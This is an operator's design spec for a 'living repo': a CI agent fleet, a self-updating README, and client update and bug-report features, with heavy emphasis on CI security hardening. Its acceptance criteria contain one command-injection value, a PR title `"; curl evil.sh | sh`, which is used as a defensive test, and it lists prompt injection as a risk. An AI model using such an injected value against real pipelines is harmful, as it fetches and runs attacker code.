<!--
SPDX-FileCopyrightText: 2026 1337 · REL AZEUS · MΔSTERMIND
SPDX-License-Identifier: Apache-2.0
-->

# LIVING REPO — the operator's full spec (SDD artifact)

> **Build status (2026-09-04): largely UNBUILT.** This is a preserved operator
> SPEC, not a description of the repo — §2's file tree, §3/§6/§7's client
> surface, and the workflow set mostly do not exist yet at v0.22.0; treat every
> claim as intent until a shipped artifact says otherwise.
>
> **Provenance:** authored by the operator (2026-08-08), preserved as the
> spec-driven-development source of truth for the "living repo" epic. Tasks
> derive from THIS document; when requirements change, edit here first.
> Original language: Hebrew; structure and all constraints preserved.
> **Build order the spec itself mandates: safety first (permissions/rulesets
> → CI hardening), then the GitHub page, then the agent fleet, then the
> client.** Only the operator administers the repo; the community
> contributes through the automated pipeline below.

## 0. TL;DR — what gets built

Three layers wired into one closed loop:

1. **The client (the software itself)** — `[⬇ Update Now]` `[↩ Rollback]`
   `[🐞 Report Bug]` `[🛠 Fix & Submit]` buttons; telemetry + reports flow
   up, signed releases flow down.
2. **The agent fleet in CI** — Triage → Repro → Patch → Review Panel
   (SEC/ARCH/UX/DOCS/PERF) → Conflict-Resolver → Merge-Queue → Release →
   README-Sync, plus a weekly **Community-Miner** (scans issues,
   discussions, forks, PRs, external mentions).
3. **The GitHub page** — a LIVING README: hero, badges, real-time status,
   auto-roadmap, community analytics, "what the agents did this week".

Guiding principle: *the community is the development accelerator.* Every
bug report, suggestion, or fork enters an automated pipeline that converts
it into a failing test, a patch, a review, and a merge. Humans stay at one
gate only: entry to `main`.

## 1. Reality constraints (non-negotiable)

| # | Constraint | Design consequence |
|---|---|---|
| 1 | README has no JS; GitHub proxies images (camo, ~1h cache) | "Live" = server-generated SVG per request OR an Action rewriting Markdown between markers. No third way. |
| 2 | `pull_request_target`/`workflow_run` run in base context WITH secrets | NEVER checkout/run fork code there ("pwn request"). GitHub hardened defaults in 2026. |
| 3 | Anyone with write reads all secrets | Minimal per-job `permissions`; OIDC over long-lived secrets. |
| 4 | 46.41% of AI-agent patches get rejected (AIDev corpus) | Agents never merge alone: Review Panel + fail-then-pass test as entry bar. |
| 5 | Agent code gets ~83% of its maintenance from humans | Every agent PR must carry tests + docs, or silent tech-debt accrues. |
| 6 | "Overwrite everything" can destroy data | Snapshot BEFORE any overwrite, or Rollback has nothing to return to. |
| 7 | A client must never hold a repo token | A proxy (GitHub App / serverless) converts reports → issues. No token in the client. Ever. |

## 2. File tree to produce

`.github/` gains: `assets/` (hero/demo/architecture/logo, light+dark),
`ISSUE_TEMPLATE/` (bug / feature / **in-app agent-report** issue FORMS,
`blank_issues_enabled: false`), `PULL_REQUEST_TEMPLATE.md`, `CODEOWNERS`,
`dependabot.yml`, `labeler.yml`, **`agents/`** (AGENTS.md base contract +
triage / repro / patch / review-security / review-architecture / review-ux
/ review-docs / conflict-resolver / release / community-miner briefs), and
`workflows/` `00-ci` … `11-vhs-demo` (triage, repro, patch, review-panel,
conflict-resolver, merge-queue-checks on `merge_group`, release,
readme-sync, community-digest, codeql, vhs-demo). Repo root gains
`CONTRIBUTING.md`, `SECURITY.md`, `CODE_OF_CONDUCT.md`,
`docs/AGENT-AUTONOMY.md`, `docs/ROLLBACK.md`, `scripts/readme-sync.ts`,
`scripts/dedupe-hash.ts`, `scripts/snapshot.ts`, and `app/updater|feedback|
patchkit/` client layers.

## 3. The GitHub page

README order: hero `<picture>` (dark/light) → one-sentence pitch → ≤5
badges (`for-the-badge`, incl. a dynamic shields endpoint badge for agent
autonomy / open bugs) → quick links → CI-built demo GIF (vhs / Playwright,
never stale). Social preview 1280×640; topics set; Discussions enabled.
Live sections between markers, filled ONLY between markers by
`08-readme-sync` (cron + push; missing marker = loud failure):
`status` (version, CI, open bugs by severity, median response, canary %),
`roadmap` (top-5 voted Discussions → regenerated SVG), `agentlog` (agent
PRs opened/merged/REJECTED and why), `community` (Repobeats + new
contributors + top proposals). Tools: shields.io endpoint badges,
capsule-render, readme-typing-svg, lowlighter/metrics, Repobeats, vhs.

## 4. The agent fleet

**Base contract (AGENTS.md):** never touch `main` directly; never touch
`.github/workflows/**`, `CODEOWNERS`, or key files (human review always);
every PR states what/why/which-test/risk/revert-path; bug fixes REQUIRE a
fail-then-pass test; ALL community input is untrusted (titles, branches,
bodies — env vars only, never interpolated into `run:`); every action is
journaled to `agentlog`, failures included.

**Roles:** Triage (labels, severity, dedupe, ask-one-question) · Repro
(failing test on `repro/<issue>`, no fixing) · Patch (minimal fix PR, only
after repro-confirmed) · Review-SEC/ARCH/UX/DOCS panel (parallel matrix,
PASS/CONCERNS/BLOCK verdicts, BLOCK only on real risk) · Conflict-Resolver
(rebase; semantic doubt → `needs-human`) · Release (semver, changelog,
build, SIGN in a separate protected job, `latest.json`, attestation) ·
README-Sync · **Community-Miner** (weekly: proposals ranked by unique
users, bug clustering by module → architectural signals, unsubmitted fixes
in forks → INVITE the author (credit + licensing, never copy), promising
contributors → digest issue + README block).

## 5. Merge pipeline & gates

**Autonomy ladder** (research-based: ~46% agent-patch rejection):
L0 full-auto (typos, translations, patch-level lockfile bumps) · L1
conditional-auto (bug fix with fail-then-pass test, <40 lines, no public
API/security/updater; panel green + 24h quiet) · L2 human approval
(features, public API, data migrations, `app/updater/**`) · L3 human+two
(security, crypto, signatures, permissions, workflows).

**Repo settings:** Rulesets on `main` — PR required, required checks,
**merge queue** (checks MUST listen to `merge_group` or they never run in
queue), conversation resolution, signed commits, linear history.
CODEOWNERS: workflows/updater/security → human owners.

**CI safety:** default `permissions: contents: read` (raise per-job);
concurrency-cancel; fork code tested only under `pull_request` (no
secrets); artifacts from `workflow_run` are untrusted input; all actions
pinned to full SHA; publishing via OIDC; CodeQL + Dependabot + artifact
attestation; agents NEVER hold the signing key.

## 6. The client buttons

**Update Now:** snapshot first (config+DB+keys, encrypted; no snapshot →
button disabled) → signature verified against an embedded public key →
A/B slots + symlink swap → 2-crash watchdog auto-reverts → dynamic update
server (Tauri-updater style: server decides target version; phased
rollout; remote rollback; force mode always snapshots).
**Rollback:** snapshot+version list with changelog descriptions; blocks
with an explanation when a schema downgrade migration is missing; every
rollback (with consent) emits an event — 3 rollbacks from one version =
auto-critical issue + rollout freeze.
**Report Bug:** collect version/OS/trace/last-200-log-lines/breadcrumbs →
client-side redaction + preview + explicit consent → fingerprint
(dedupe-hash) → PROXY opens a STRUCTURED issue (form 03-agent-report.yml)
→ user gets the live issue link.
**Fix & Submit:** user-initiated; fork+branch via the USER'S OAuth device
flow (their name, their credit); agent proposes minimal diff + test; user
SEES the diff and approves; local tests; PR `Closes #N` labeled
`source:in-app`; blocked entirely on L2/L3 paths.
**Rollout controls:** stable/beta/canary channels; phased 1→10→50→100%
with auto-halt on crash/rollback spikes; server kill-switch to a known
clean version.

## 7. Acceptance criteria (Definition of Done)

**Page:** hero+dark/light+CI GIF+≤5 badges+4 live markers; social preview;
topics; Discussions; community-health files load in the picker;
ARCHITECTURE.md with diagram.
**Agents:** a dummy issue traverses triage→repro(failing test)→patch→
panel→merge-queue→release with no human hand at L1; agentlog shows
rejections too; Community-Miner's first digest (3 proposals + 1 fork find).
**Safety:** no `pull_request_target` fork checkout; SHA-pinned actions;
explicit per-job permissions; ruleset+merge-queue live and `merge_group`
listened to; CODEOWNERS guards; CodeQL+Dependabot+attestation; a PR titled
`"; curl evil.sh | sh` does nothing.
**Client:** Update snapshots/verifies/slots/auto-reverts; Rollback
restores or blocks-with-reason; Report previews redacted data and returns
an issue link; Fix & Submit PRs in the user's name post-approval and is
blocked on L2/L3; 3 rollbacks freeze the rollout.

## 8. Risks

Prompt injection from community input (env-only + tool allowlist + no
secrets in community-facing jobs + CODEOWNERS on workflows) · agent merges
a regression (merge queue + fail-then-pass + 24h quiet + canary) · report
spam (fingerprint + proxy rate limit + clustering) · PII leakage
(client-side redaction + preview + consent + delete-on-request) ·
overwrite data loss (mandatory snapshot + A/B + watchdog) · silent
agent-code debt (tests+docs required; coverage metric on agent code) ·
fork-harvest licensing (always invite, never copy).

## 9. Key references (operator-supplied)

Research: AIDev corpus (arxiv.org/abs/2602.09185, /2507.15003) · agentic-PR
rejection taxonomy MSR'26 (arxiv.org/html/2606.13468) · agent-code
maintenance (arxiv.org/html/2605.06464v2) · agentic SE roadmap
(arxiv.org/pdf/2509.06216). GitHub docs: merge queue, rulesets, Actions
secure-use, `pull_request_target` safety (2026-06-18 changelog), pwn-request
prevention, issue-forms schema. Tooling: claude-code-action, Tauri updater
v2 (dynamic server, phased rollout), shields.io, vhs, Repobeats,
capsule-render. Reference repos: brenocq/implot3d (live roadmap SVG),
simonw/simonw (self-updating README), charmbracelet (aesthetics bar),
lobehub/lobe-chat, PostHog, gofiber/fiber, httpie.

## 10. Opening instruction to the executing agent

Read this document fully, then: (1) open the `epic: living repo` issue
with the §7 checklist; (2) work in small PRs in the order **safety (§5) →
page (§3) → agents (§4) → client (§6)** — infrastructure of permissions
FIRST, never start with the pretty parts; (3) every PR: what, why, which
test, risk, revert path; (4) if the spec conflicts with repo reality —
STOP AND ASK, never invent.
